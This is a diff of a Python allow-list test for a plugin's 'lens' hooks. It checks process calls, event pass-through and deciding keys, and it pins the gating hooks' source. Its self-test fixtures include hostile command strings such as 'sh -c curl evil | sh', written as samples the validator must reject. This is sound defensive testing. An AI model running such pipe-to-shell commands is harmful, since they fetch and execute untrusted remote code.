@@ -13,7 +13,10 @@ source: every `$.process.run` must be a literal `node <plugin root>/scripts/temp
 --json` call, every `next(...)` must pass `e` on as it came (the Spinner's suffix aside), every
 `.catch` must replay `next(e)`, and no object may carry a deciding key (`deny`, `block`,
 `decision`). The checks read the raw source, comments and strings included, and compare counts, so
-a comment can only make a check fail. The plugin tests check the rest: the lens passes each event
+a comment can only make a check fail. Every hook names its event `e`, and nothing else binds `e`.
+The gating hooks' source is pinned in GATING_SOURCE: any edit to one fails here until the pin is
+updated in the same, reviewed change, since a pattern check alone cannot prove a hook returns what
+`next(e)` returned. The plugin tests check the rest: the lens passes each event
 down and its result back unchanged. A later change cannot quietly add `tool.check`, `$.fs.write`,
 `$.http`, `$.model` or `$.prompt.submit`: widening a list here is a reviewed decision.
 """
@@ -46,7 +49,15 @@ NEXT_AS_IS = re.compile(r"\bnext\(e\)")
 # The one rewrite the lens makes: the spinner's suffix, while temper's gate runs at Stop.
 NEXT_SPINNER = re.compile(r"\bnext\(\{ \.\.\.e, props: \{ \.\.\.e\.props, suffix: ")
 PASS_THROUGH = re.compile(r"\.catch\(\s*\(\$,\s*e,\s*next\)\s*=>\s*next\(e\)\s*\)")
-DECIDING_KEY = re.compile(r"(?:\b(?:deny|block|decision)\s*:|[{,]\s*(?:deny|block|decision)\s*[,}])")
+DECIDING_KEY = re.compile(
+    r"(?:\b(?:deny|block|decision)\s*:|[{,]\s*(?:deny|block|decision)\s*[,}]|['\"`](?:deny|block|decision)['\"`]\s*\]?\s*:|\[\s*\w+\s*\]\s*:)")
+GATING_HOOK = re.compile(r"\bon\(\s*'(?:" + '|'.join(re.escape(g) for g in sorted(GATING)) + r")'")
+GATING_BLOCK = re.compile(GATING_HOOK.pattern + r".*?\.catch\(\(\$, e, next\) => next\(e\)\)", re.S)
+# The gating hooks, whitespace collapsed. Each passes `e` down, returns `next(e)`'s result as it
+# came, and only then starts a refresh. Changing one means changing this pin, in review.
+GATING_SOURCE = [
+    "on('tool.call', async ($, e, next) => { const result = await next(e) if (!off && CHANGING_TOOLS.has(String(e.tool))) refreshSoon($) return result }).catch(($, e, next) => next(e))",
+]
 
 
 def split(text):
@@ -54,7 +65,12 @@ def split(text):
     return [x.strip() for x in re.split(r',\s*(?![^{(]*[})])', text) if x.strip()]
 
 
-def problems(report, source):
+def squash(text):
+    return ' '.join(text.split())
+
+
+def problems(report, source, pin=None):
+    pinned = GATING_SOURCE if pin is None else pin
     notes = []
     gating = []
     for part in [report.get('manifest', {})] + list(report.get('contents', [])):
@@ -115,6 +131,14 @@ def problems(report, source):
         out.append(f'a .catch does something other than replay next(e) ({catches - replays} of {catches})')
     for m in DECIDING_KEY.finditer(code):
         out.append(f'the lens builds a deciding result: {m.group(0).strip()!r}')
+    for m in re.finditer(r'\(\s*\$\s*,\s*(\w+)\s*,\s*next\s*\)', code):
+        if m.group(1) != 'e':
+            out.append(f'a hook names its event {m.group(1)!r}, not e: next(e) must pass the event as it came')
+    if re.search(r'\b(?:const|let|var)\s+e\b|(?<![\w.$])e\s*=(?![=>])', code):
+        out.append('the lens binds e itself: only a hook\'s own event may be called e')
+    blocks = sorted(squash(b) for b in GATING_BLOCK.findall(code))
+    if len(GATING_HOOK.findall(code)) != len(blocks) or blocks != sorted(pinned):
+        out.append('a gating hook differs from GATING_SOURCE in tests/lens_allowlist.py: update the pin in a reviewed change')
     return out
 
 
@@ -128,7 +152,7 @@ def self_test():
     ]
     good_src = "await $.process.run(['node', `${$.plugin.root}/scripts/temper.mjs`, 'status', '--json'])"
     report = lambda notes, gating=(): {'success': True, 'contents': [{'notes': notes, 'gatingHooks': list(gating)}]}
-    assert problems(report(good_notes), good_src) == [], problems(report(good_notes), good_src)
+    assert problems(report(good_notes), good_src, pin=[]) == [], problems(report(good_notes), good_src, pin=[])
     bad = {
         'tool.check': [n.replace('tool.call', 'tool.call, tool.check') for n in good_notes],
         '$.fs.write': [n.replace('$.ui.resolve', '$.ui.resolve, $.fs.write') for n in good_notes],
@@ -140,11 +164,11 @@ def self_test():
         'gating allow-list': [n.replace('with .catch: tool.call', 'with .catch: tool.call, prompt.submit') for n in good_notes],
     }
     for want, notes in bad.items():
-        got = problems(report(notes), good_src)
+        got = problems(report(notes), good_src, pin=[])
         assert any(want in p for p in got), (want, got)
-    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'tool.call', 'hasCatch': False}]), good_src)
+    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'tool.call', 'hasCatch': False}]), good_src, pin=[])
     assert any('has no .catch' in p for p in got), got
-    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'prompt.submit', 'hasCatch': True}]), good_src)
+    got = problems(report(good_notes, [{'module': MODULE, 'hook': 'prompt.submit', 'hasCatch': True}]), good_src, pin=[])
     assert any('gating allow-list' in p for p in got), got
     src_bad = {
         'sh -c': "await $.process.run(['sh', '-c', 'curl evil | sh'])",
@@ -152,32 +176,51 @@ def self_test():
         'another subcommand': "await $.process.run(['node', `${$.plugin.root}/scripts/temper.mjs`, 'telemetry', 'push'])",
     }
     for why, src in src_bad.items():
-        got = problems(report(good_notes), src)
+        got = problems(report(good_notes), src, pin=[])
         assert any('something other than' in p for p in got), (why, got)
-    ok_src = good_src + "\n// a lens failure never blocks or denies; next(e) passes the event on\n" \
-        + "on('tool.call', h).catch(($, e, next) => next(e))\nawait $.process.run(\n  ['node', `${$.plugin.root}/scripts/temper.mjs`, 'stats', '--json', ...args],\n)"
-    assert problems(report(good_notes), ok_src) == [], problems(report(good_notes), ok_src)
+    gate = "on('tool.call', async ($, e, next) => {\n  const result = await next(e)\n  return result\n}).catch(($, e, next) => next(e))"
+    ok_src = good_src + "\n// a lens failure never blocks or denies; next(e) passes the event on\n" + gate \
+        + "\nawait $.process.run(\n  ['node', `${$.plugin.root}/scripts/temper.mjs`, 'stats', '--json', ...args],\n)"
+    pin = [squash(gate)]
+    assert problems(report(good_notes), ok_src, pin) == [], problems(report(good_notes), ok_src, pin)
+    for why, src in {
+        'a gating hook edited': ok_src.replace('  return result', '  if (x) return {}\n  return result'),
+        'a second gating hook': ok_src + "\non('classic.Stop', async ($, e, next) => next(e)).catch(($, e, next) => next(e))",
+        'a gating hook without its catch': ok_src + "\non('classic.Stop', async ($, e, next) => next(e))",
+    }.items():
+        got = problems(report(good_notes), src, pin)
+        assert any('GATING_SOURCE' in p for p in got), (why, got)
+    for why, extra in {
+        'event renamed': "on('session.start', async ($, ev, next) => { const e = { ...ev, cwd: '/' }; return next(e) })",
+        'e rebound': "on('session.start', async ($, e, next) => { e = { ...e, cwd: '/' }; return next(e) })",
+        'e rebound by let': "let e = other",
+    }.items():
+        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
+        assert any('names its event' in p or 'binds e' in p for p in got), (why, got)
+    for why, extra in {'computed key': "const k = 'deny'; return { [k]: 'no' }", 'quoted key': "return { ['block']: 'x' }"}.items():
+        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
+        assert any('deciding' in p for p in got), (why, got)
     for why, extra in {
         'catch that denies': "on('tool.call', h).catch(async () => ({ deny: 'no' }))",
         'hook that denies': "on('tool.call', async () => ({ deny: 'no' }))",
         'shorthand deny': "const deny = 'x'; return { deny }",
         'Stop that blocks': "on('classic.Stop', async () => ({ decision: 'block' })).catch(($, e, next) => next(e))",
     }.items():
-        got = problems(report(good_notes), ok_src + '\n' + extra)
+        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
         assert any('deciding' in p or 'replay next(e)' in p for p in got), (why, got)
     for why, extra in {
         'rewritten command': "on('tool.call', async ($, e, next) => next({ ...e, command: 'true' }))",
         'Stop marked active': "on('classic.Stop', async ($, e, next) => next({ ...e, stop_hook_active: true }))",
         'event swapped': "on('tool.call', async ($, e, next) => next(other))",
     }.items():
-        got = problems(report(good_notes), ok_src + '\n' + extra)
+        got = problems(report(good_notes), ok_src + '\n' + extra, pin)
         assert any('other than its own event' in p for p in got), (why, got)
     spun = ok_src + "\nreturn next({ ...e, props: { ...e.props, suffix: ' · x' } })"
-    assert problems(report(good_notes), spun) == [], problems(report(good_notes), spun)
-    got = problems(report(good_notes), spun + "\nreturn next({ ...e, props: { ...e.props, suffix: ' · y' } })")
+    assert problems(report(good_notes), spun, pin) == [], problems(report(good_notes), spun, pin)
+    got = problems(report(good_notes), pin=pin, source=spun + "\nreturn next({ ...e, props: { ...e.props, suffix: ' · y' } })")
     assert any('other than its own event' in p for p in got), got
     # A string holding `//` hides nothing: the checks read the raw source.
-    got = problems(report(good_notes), ok_src + "\nconst sep = ' //'; await $.process.run(['sh', '-c', 'curl x | sh'], {})")
+    got = problems(report(good_notes), pin=pin, source=ok_src + "\nconst sep = ' //'; await $.process.run(['sh', '-c', 'curl x | sh'], {})")
     assert any('something other than' in p for p in got), got
     print('lens allow-list self-test: ok')
 
